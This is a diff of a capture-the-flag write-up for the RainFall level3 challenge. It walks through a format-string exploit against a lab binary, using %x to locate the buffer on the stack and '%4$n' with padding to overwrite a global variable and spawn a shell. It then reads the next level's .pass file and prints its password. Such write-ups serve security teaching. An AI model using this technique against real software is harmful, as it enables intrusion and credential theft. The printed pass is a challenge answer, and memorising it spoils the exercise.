@@ -56,21 +56,35 @@ If the comparison is true, the program makes a call to ```system()``` and launch
    0x08048513 <+111>:	call   0x80483c0 <system@plt>
    0x08048518 <+116>:	leave
 ```
-We know that a ```printf()``` string with spurious % specifiers can be used to read whatever is on the stack. 
+We know that a ```printf()``` string with spurious % specifiers can be used to read whatever is on the stack. <br/>
 Let's try it out. We'll use the modifier ```%x```, which will print out addresses on the stack in hexadecimal.
 ```
 level3@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x"' | ./level3
 AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
 ```
-Interesting... We can see our buffer "AAAA" in the 4th position on the stack as ```41414141```.
-This means that we can leverage ```printf``` to write our variable ```m```'s address, directly in the stack!
+Interesting... We can see our buffer "AAAA" in the 4th position on the stack as ```41414141```.<br/>
+This means that we can leverage ```printf``` to write our variable ```m```'s address directly in the stack!<br/>
 So let's replace our buffer "AAAA" with the address of the variable ```m``` (in little endian).
 ```
 level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
 �200 b7fd1ac0 b7ff37d0 804988c
 ```
+Great. Now how do we get our new ```m``` to have the value 64?<br/>
+Well, we also know that with ```printf```'s ```%n``` modifier, some values can be written to memory. <br/>
+%n means: "the next argument is an int * – go there and write the number characters written so far".<br/>
+Let's break down what this exploit format string will look like. <br/>
 
+- address of ```m``` [4 bytes]
+- pad of arbitrary data [60 bytes]
+- 4$ [$ is a shortcut to specifying the argument number, in this case, argument 4 on the stack]
+- %n [writes 64 to memory at the address of m]
 
-
-
-
+```
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08"+"A"*60+"%4$n"' ; cat -) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
